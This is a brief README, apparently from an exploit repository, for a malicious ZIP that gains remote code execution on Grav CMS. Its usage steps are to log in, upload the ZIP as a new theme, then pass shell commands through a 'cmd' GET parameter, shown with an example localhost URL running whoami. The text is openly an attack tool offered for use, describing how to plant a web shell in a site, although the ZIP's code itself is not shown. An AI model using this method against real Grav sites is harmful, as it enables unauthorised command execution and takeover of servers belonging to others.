# Malicious Zip to achieve RCE on Grav CMS if authenticated.

Usage:
1. Download ZIP
2. Log in to the CMS
3. Go to themes
4. Upload new theme
5. Add "cmd" get parameter for command execution.

`http://localhost/grav/grav-admin/admin/themes?cmd=whoami`
